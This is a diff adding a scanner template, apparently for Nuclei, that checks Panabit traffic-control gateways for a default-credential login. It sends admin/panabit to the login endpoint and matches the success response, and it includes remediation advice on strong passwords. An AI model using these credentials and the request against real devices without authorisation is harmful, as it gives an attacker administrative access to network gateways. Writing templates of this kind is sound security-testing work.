@@ -1,0 +1,58 @@
+id: panabit-default-login
+info:
+  name: Panabit Gateway Default Login
+  author:
+  - l0ne1y
+  description: |-
+    Panabit smart gateway default credential login vulnerability
+    Panabit is a practical software tool used for traffic control.
+
+    The Panabit system has a default credential login vulnerability. An attacker can exploit it to obtain sensitive information.
+  severity: high
+  remediation: |-
+    Fix:
+    1. System administrators should immediately change discovered weak passwords to strong ones.
+    2. Weak password prevention hinges on management. Enterprises should establish a strong password policy (e.g., passwords must contain at least three of uppercase letters, lowercase letters, digits, and special characters, be at least ten characters long, use an unpredictable keyboard pattern, and have no connection to corporate or personal information).
+    3. Recommended online strong password generator: [https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
+    4. Recommended online password strength checker: [https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - <META HTTP-EQUIV=REFRESH CONTENT="0;URL=/index.htm">
+    - urn:schemas-microsoft-com:vml
+  - type: word
+    part: header
+    words:
+    - paonline_admin
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /login/userverify.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Origin: {{BaseURL}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAjZMsILtbrBp8VbC
+    Referer: {{BaseURL}}/login/login.htm
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+    ------WebKitFormBoundaryAjZMsILtbrBp8VbC
+    Content-Disposition: form-data; name="username"
+
+    {{username}}
+    ------WebKitFormBoundaryAjZMsILtbrBp8VbC
+    Content-Disposition: form-data; name="password"
+
+    {{password}}
+    ------WebKitFormBoundaryAjZMsILtbrBp8VbC--
+  attack: pitchfork
+  payloads:
+    password:
+    - panabit
+    username:
+    - admin
